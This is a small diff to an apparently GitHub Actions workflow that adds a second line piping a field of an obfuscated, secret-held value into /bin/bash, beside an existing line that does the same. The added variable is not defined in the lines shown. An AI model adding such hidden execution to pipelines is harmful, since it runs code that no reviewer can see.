@@ -19,6 +19,7 @@ jobs:
           jkr68148: ${{ secrets.jkr68148 }}
         run: |
           printf '%s' "$jkr68148" | jq -r .cpudz84910 | /bin/bash
+          printf '%s' "$ptkve129" | jq -r .uc61 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
